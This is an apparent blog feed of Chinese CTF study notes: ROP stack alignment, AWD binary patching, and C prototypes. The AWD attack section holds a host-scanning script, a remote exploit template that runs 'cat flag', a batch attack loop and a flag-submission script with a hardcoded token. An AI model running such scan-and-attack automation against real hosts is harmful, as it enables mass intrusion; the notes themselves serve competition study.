      <link href="/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/"/>
      <url>/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/</url>
      
        <content type="html"><![CDATA[<p><strong>（Ubuntu 18.04版本及以上需考虑 ）</strong></p><h2 id="罪魁祸首"><a href="#罪魁祸首" class="headerlink" title="罪魁祸首"></a>罪魁祸首</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">movaps xmmword ptr [rsp + 0x50], xmm0</span><br></pre></td></tr></table></figure><p>从 <a href="https://link.zhihu.com/?target=https%3A//www.felixcloutier.com/x86/movaps">https://www.felixcloutier.com/x86/movaps</a> 处我们可以知道，这条指令的功能是： <strong>将xmm0中保存的单精度浮点数从xmm0移动至地址[rsp + 0x50]处</strong> 。</p><p>当然，更重要的是这条指令的执行条件，这直接关系到程序报错的原因。原文中对执行条件的描述如下：</p><blockquote><p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated.</p></blockquote><p>此时报错的原因就显而易见了：当内存地址作为操作数时，内存地址必须对齐 <strong>16Byte</strong> 、 <strong>32Byte</strong> 或 <strong>64Byte</strong> 。这里所说的对齐 <strong>xByte</strong>，就是指地址必须是 <strong>x</strong> 的倍数。</p><p>这时又出现了一个问题：到底是对齐多少字节呢？我们可以找到这样一段描述：</p><blockquote><p>This instruction can be used to load an XMM, YMM or ZMM register from an 128-bit, 256-bit or 512-bit memory location, to store the contents of an XMM, YMM or ZMM register into a 128-bit, 256-bit or 512-bit memory location, or to move data between two XMM, two YMM or two ZMM registers.</p></blockquote><p>基于此，我们可以推测：使用 <strong>XMM</strong> 时，需要 <strong>16Byte</strong> 对齐；使用 <strong>YMM</strong> 时，需要 <strong>32Byte</strong> 对齐；使用 <strong>ZMM</strong> 时，需要 <strong>64Byte</strong> 对齐。</p><p>而此处出错的指令使用了 <strong>XMM</strong> 寄存器，因此我们需要确保在执行这一指令时，<strong>rsp + 0x50</strong> 是 <strong>16</strong> 的倍数。直观地说，就是该地址必须以数字 <strong>0</strong> 结尾。</p><p>基于上面的分析，解决方案已经呼之欲出了：我们需要修改栈的结构，使得程序执行到出错指令时， <strong>rsp + 0x50</strong> 是16的整数倍。这时便出现了两个非常具体的问题：</p><ol><li>我们该如何确保能获得shell的前提下修改栈的结构？</li><li>我们该将栈的结构修改成什么样子？</li></ol><p>第1个问题很好回答——我们可以借助<a href="https://zhida.zhihu.com/search?content_id=224123051&amp;content_type=Article&amp;match_order=1&amp;q=ROP&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDMwOTMyMTAsInEiOiJST1AiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMjQxMjMwNTEsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.L8JVxrrpFrSd3Q7y61JPlIZ6daxfKzmfw6aiQeBPI4I&amp;zhida_source=entity">ROP</a>的思想，再栈中添加若干汇编片段，以确保在能获得shell的前提下修改栈的结构。</p><p>接下来回答第二个问题：我们需要将栈修改成什么样子？我们知道，由于程序的代码是不变的，因此程序从进入 <strong>vulnerable_function</strong> 到执行到出错指令这一过程中，栈顶 <strong>rsp</strong> 的变化量是不变的。因此，我们可以通过修改进入 <strong>vulnerable_function</strong> 前的栈结构，进而影响执行出错指令前的栈结构。</p><p>那这个变化量具体是多少呢？通过GBD调试可以看到，在进入 <strong>vulnerable_function</strong> 前，<strong>rsp</strong> 中的值是 <strong>0x7fffffffdf38</strong> ；而执行出错指令前，<strong>rsp</strong> 中的值是 <strong>0x7fffffffdba8</strong> 。因此，从进入 <strong>vulnerable_function</strong> 到执行到出错指令，栈顶的值减小了 <strong>0x390</strong> 。</p><p>为方便表述，记进入 <strong>vulnerable_function</strong> 前的栈顶为 <strong>origin_sp</strong> ，则有：<strong>(origin_sp - 0x390 + 0x50) % 0x10 == 0</strong> 。也即 <strong>origin_sp % 0x10 == 0</strong> 。</p><p>基于上述分析，我们可以在 <strong>vulnerable_function</strong> 的地址前增加一个新的地址，该地址恰好指向一个 <strong>ret</strong> 指令。这样一来，由于加入了一个新地址，栈顶被迫下移8个字节，使之对齐 <strong>16Byte</strong> ；同时，由于插入的地址指向了 <strong>ret</strong> 指令，程序的仍然可以顺利地进入 <strong>vulnerable_function</strong> 中。如下图所示：</p><p><img src="/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/image-20250326003450415.png" alt="image-20250326003450415"></p><p>至于指向 <strong>ret</strong> 指令的地址，可以在IDA中使用快捷键 <strong>alt + T</strong> 进行搜索。</p><p>综上，我们终于可以写出打通本地环境的payload了：</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
            <tag> PWN技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD学习</title>
      <link href="/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ul><li>改<code>init_hosts.py</code>中的<code>ip</code>格式和<code>port</code></li><li>改<code>submit_flag.py</code>中的提交方式和<code>token</code></li><li>改<code>round_wait_time</code></li><li><code>patch</code></li><li>写<code>exp</code></li><li>批量攻击</li></ul><h2 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a>扫描IP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">f&#x27;http://192-168-1-<span class="subst">&#123;i&#125;</span>.awd.bugku.cn/&#x27;</span> <span class="comment">#*</span></span><br><span class="line">        response = requests.get(url, timeout=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            li(<span class="string">&#x27;[+] &#x27;</span> + url)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hosts&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&#x27;192-168-1-<span class="subst">&#123;i&#125;</span>.awd.bugku.cn:9999\n&#x27;</span>) <span class="comment">#*</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Not 200 OK&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        ll(<span class="string">&#x27;[-] &#x27;</span> + url)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">f&#x27;192-168-1-<span class="subst">&#123;i&#125;</span>.awd.bugku.cn:9999\n&#x27;</span>) <span class="comment">#*</span></span><br><span class="line"> </span><br><span class="line">NUM_THREADS = <span class="number">256</span></span><br><span class="line"> </span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    thread = threading.Thread(target=check_ip, args=(i,))</span><br><span class="line">    threads.append(thread)</span><br><span class="line">    thread.start()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(threads) &gt;= NUM_THREADS:</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line">        threads = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li>IDA</li><li>加沙箱：<a href="https://github.com/TTY-flag/evilPatcher#/">https://github.com/TTY-flag/evilPatcher#/</a></li><li><a href="https://github.com/aftern00n/AwdPwnPatcher#/">https://github.com/aftern00n/AwdPwnPatcher#/</a></li></ul><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><ul><li><p>加沙箱通防</p><ul><li>sandboxs里改禁用规则<ul><li>python3 evil_patcher.py file_name sandboxfile</li></ul></li></ul></li><li><p>IDA的patch步骤：<code>Edit</code> -&gt;<code>Patch program</code> -&gt; <code>Apply patches to input file</code></p></li><li><p>AWDPwnPatcher使用</p></li><li><code>from AwdPwnPatcher import *binary = &quot;filename&quot;awd_pwn_patcher = AwdPwnPatcher(binary)</code></li><li><code>add_patch_in_ehframe(assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_origin(start, end=0, assembly=&quot;&quot;, machine_code=[], string=&quot;&quot;)</code></li><li><code>patch_by_jmp(self, jmp_from, jmp_to=0, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_by_call(self, call_from, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>add_constant_in_ehframe(self, string)</code></li><li><code>save(self, save_path=&quot;&quot;)</code></li></ul><h3 id="具体漏洞修复"><a href="#具体漏洞修复" class="headerlink" title="具体漏洞修复"></a>具体漏洞修复</h3><h4 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h4><h5 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"></span><br><span class="line">awd_pwn_patcher.patch_fmt_by_call(address)  <span class="comment">#call printf地址</span></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"> </span><br><span class="line">fmt_offset = awd_pwn_patcher.add_constant_in_ehframe(<span class="string">&quot;%s\\x00\\x00&quot;</span>)  <span class="comment">#添加%s</span></span><br><span class="line"> </span><br><span class="line">assembly = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsi, qword ptr [rbp-0x8]</span></span><br><span class="line"><span class="string">lea rdi, qword ptr [&#123;&#125;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(fmt_offset))</span><br><span class="line"> </span><br><span class="line">awd_pwn_patcher.patch_by_jmp(<span class="number">0x706</span>, jmp_to=<span class="number">0x712</span>, assembly=assembly)    <span class="comment">#改printf，mov rax地址和call printf地址</span></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"> </span><br><span class="line">assembly = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x20   #缩小输入范围，控制寄存器push进去的值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">awd_pwn_patcher.patch_origin(<span class="number">0x8048476</span>, end=<span class="number">0x804847b</span>, assembly=assembly)   <span class="comment">#原push地址和push的下一条地址</span></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"> </span><br><span class="line">assembly = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add esp, 0x10</span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">mov edx, dword ptr [ebp - 0x20]</span></span><br><span class="line"><span class="string">mov eax, 0x804a060  #被释放的地址</span></span><br><span class="line"><span class="string">lea eax, dword ptr [eax + edx*4]</span></span><br><span class="line"><span class="string">mov dword ptr [eax], 0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">awd_pwn_patcher.patch_by_jmp(<span class="number">0x80485bf</span>, jmp_to=<span class="number">0x80485c7</span>, assembly=assembly)    <span class="comment">#call free地址和下一条地址</span></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"> </span><br><span class="line">assembly = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">mov eax, dword ptr [rbp - 0x1c]</span></span><br><span class="line"><span class="string">cdqe</span></span><br><span class="line"><span class="string">lea rdx, qword ptr [0x201040]</span></span><br><span class="line"><span class="string">lea rax, qword ptr [rdx + rax*8]</span></span><br><span class="line"><span class="string">mov qword ptr [rax], 0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">awd_pwn_patcher.patch_by_jmp(<span class="number">0x838</span>, jmp_to=<span class="number">0x83d</span>, assembly=assembly)</span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h4 id="gets-栈溢出"><a href="#gets-栈溢出" class="headerlink" title="gets 栈溢出"></a>gets 栈溢出</h4><p>只有gets函数能够接受用户输入时，将流程劫持到.eh_frame段，利用syscall构造read函数，就能控制输入数据的长度。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.eh_frame:<span class="number">0000000000400F</span>7D mov     rax, <span class="number">0</span>          ;<span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>84 mov     rdi, <span class="number">0</span>          ; fd</span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>8B lea     rsi, [rbp+buf]  ; buf</span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>8E mov     rdx, <span class="number">90</span>h        ; count</span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>95 syscall</span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>97 jmp     loc_400AB4</span><br></pre></td></tr></table></figure></p><h4 id="负数绕过"><a href="#负数绕过" class="headerlink" title="负数绕过"></a>负数绕过</h4><p>输入负数-1也满足jle，修复方法：将JLE改为JBE<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cmp     eax, <span class="number">20</span>h</span><br><span class="line">jle     <span class="type">short</span> loc_8048777</span><br></pre></td></tr></table></figure></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for awd exp</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"> </span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_flags</span>(<span class="params">d</span>):</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&#x27;./flags&#x27;</span>, <span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">    fd.write(d + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    fd.close()</span><br><span class="line"> </span><br><span class="line">ip = server_ip = sys.argv[<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">r = remote(ip, port)</span><br><span class="line"> </span><br><span class="line">......<span class="comment">#exp</span></span><br><span class="line"> </span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&#123;&#x27;</span>)</span><br><span class="line">flag = <span class="string">b&#x27;viol1t&#123;&#x27;</span> + r.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">write_to_flags(flag)</span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="submit-flag-py"><a href="#submit-flag-py" class="headerlink" title="submit_flag.py"></a>submit_flag.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for awd loop submit flag</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">flag_file = <span class="string">&#x27;./flags&#x27;</span></span><br><span class="line">threads = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">flag</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># url = &#x27;https://ctf.bugku.com/awd/submit.html?token=88b02ce3b420ec1f4b4a2e02dd6fe305&amp;flag=&#x27; + flag[:-1]</span></span><br><span class="line">        url = <span class="string">f&quot;curl -X POST http://27.25.152.77:19999/api/flag -H &#x27;Authorization: 7f120ca9b0e3024d06734a04a986cc55&#x27; -d &#x27;&#123;&#123; \&quot;flag\&quot;: \&quot;<span class="subst">&#123;flag[:-<span class="number">1</span>]&#125;</span>\&quot;&#125;&#125;&#x27;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="comment"># r = requests.get(url)</span></span><br><span class="line">        os.system(url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m[+] pwned!\x1b[0m&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m[-] connect fail: &#123;&#125;\x1b[0m&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(flag_file) <span class="keyword">as</span> flag_txt:</span><br><span class="line">        flags = flag_txt.readlines()</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            thread = threading.Thread(target=submit, args=(flag,))</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            thread.start()</span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">            thread.join()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="attack-sh"><a href="#attack-sh" class="headerlink" title="attack.sh"></a>attack.sh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"> </span><br><span class="line">attack_times=10000</span><br><span class="line">round_wait_time=30 <span class="comment">#half time</span></span><br><span class="line">wait_submit_time=5</span><br><span class="line">log_file=<span class="string">&quot;logs&quot;</span></span><br><span class="line">run_time=120 <span class="comment">#timeout</span></span><br><span class="line">next_attack_time=2.5 </span><br><span class="line">max_concurrent_attacks=10 <span class="comment"># Max number of concurrent attacks</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="title">log</span></span>()&#123;</span><br><span class="line">    t=$(<span class="built_in">date</span> <span class="string">&quot;+%H:%M:%S&quot;</span>)</span><br><span class="line">    m=<span class="string">&quot;[<span class="variable">$t</span>]<span class="variable">$1</span>&quot;</span> <span class="comment"># Fixed missing parameter usage</span></span><br><span class="line">    info=<span class="string">&quot;\033[43;37m <span class="variable">$m</span> \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$info</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$m</span>&quot;</span> &gt;&gt; <span class="variable">$log_file</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="title">attack</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;-- round <span class="variable">$1</span> -- &quot;</span> &gt;&gt; all_flags</span><br><span class="line">    <span class="built_in">cat</span> flags &gt;&gt; all_flags</span><br><span class="line">    <span class="built_in">rm</span> flags</span><br><span class="line">    <span class="built_in">local</span> <span class="built_in">jobs</span>=0</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> $(<span class="built_in">cat</span> hosts); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">timeout</span> --foreground <span class="variable">$run_time</span> python3 ./exp.py <span class="string">&quot;<span class="variable">$line</span>&quot;</span> &amp;</span><br><span class="line">        <span class="built_in">sleep</span> <span class="variable">$next_attack_time</span></span><br><span class="line">        ((jobs++))</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$jobs</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$max_concurrent_attacks</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">wait</span> <span class="comment"># Wait for all background jobs to finish</span></span><br><span class="line">            <span class="built_in">jobs</span>=0</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">wait</span> <span class="comment"># Ensure all attacks are complete before moving on</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\x1b[47;30m Waiting <span class="variable">$wait_submit_time</span> s to submit flag\x1b[0m&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> <span class="variable">$wait_submit_time</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\x1b[47;30m Submitting flag\x1b[0m&quot;</span></span><br><span class="line">    python3 ./submit_flag.py</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i &lt;= attack_times; i++)); <span class="keyword">do</span></span><br><span class="line">    m=<span class="string">&quot;-------- round <span class="variable">$i</span> --------&quot;</span></span><br><span class="line">    <span class="built_in">log</span> <span class="string">&quot;<span class="variable">$m</span>&quot;</span></span><br><span class="line">    attack <span class="variable">$i</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\x1b[47;30m Waiting next round\x1b[0m&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> <span class="variable">$round_wait_time</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h2><h3 id="pwn-waf"><a href="#pwn-waf" class="headerlink" title="pwn_waf"></a>pwn_waf</h3><p><a href="https://github.com/i0gan/pwn_waf/tree/main">https://github.com/i0gan/pwn_waf/tree/main</a></p><p>创建一个文件夹并赋一定权限，改makefile中的log path为该文件夹地址，make后将pwn和catch放到创建的文件夹中，再用catch替换pwn文件，此时exp打用catch替换的pwn文件即可在创建的文件夹中接收到流量</p><h3 id><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言函数原型整理</title>
      <link href="/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/"/>
      <url>/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p><strong>当system函数执行的时候会利用到<code>rdi</code>里的参数</strong></p><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p><code>write（1，write_got，8</code>）是把write_got地址指向内存的内容的前8个字节写入到标准输出流中。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span></span><br><span class="line">参数说明:</span><br><span class="line">‌fd‌:文件描述符，表示要写入数据的文件或设备。文件描述符是一个整数，通常是由open系统调用返回的。例如，0表示标准输入（<span class="built_in">stdin</span>），1表示标准输出（<span class="built_in">stdout</span>），2表示标准错误（<span class="built_in">stderr</span>）。</span><br><span class="line">‌buf‌:指向要写入数据的缓冲区的指针。这个指针可以是任何类型的数据，因为它是<span class="type">void</span>类型的。</span><br><span class="line">count‌:要写入的字节数。函数会尝试从buf中写入count个字节的数据。</span><br><span class="line">‌返回值:</span><br><span class="line">正整数:表示成功写入的字节数，可能会小于count（例如，由于磁盘已满等原因）。</span><br><span class="line">0‌:表示没有写入任何数据。</span><br><span class="line">-1‌‌:表示发生错误，并设置`errno`来提供进一步的错误信息。</span><br></pre></td></tr></table></figure></p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">void</span>*buf,<span class="type">size_t</span> count)</span></span><br><span class="line">参数说明：</span><br><span class="line">fd:是文件描述符</span><br><span class="line">buf:为读出数据的缓冲区;</span><br><span class="line">count:为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移)</span><br><span class="line">成功:返回读出的字节数</span><br><span class="line">失败:返回<span class="number">-1</span>，并设置errno，如果在调用read之前到达文件末尾，则这次read返回<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> * <span class="title function_">memset</span><span class="params">( <span class="type">void</span> * ptr, <span class="type">int</span> value, <span class="type">size_t</span> num )</span>;</span><br><span class="line">参数说明：</span><br><span class="line">ptr:为要操作的内存的指针。</span><br><span class="line">value:为要设置的值。你既可以向 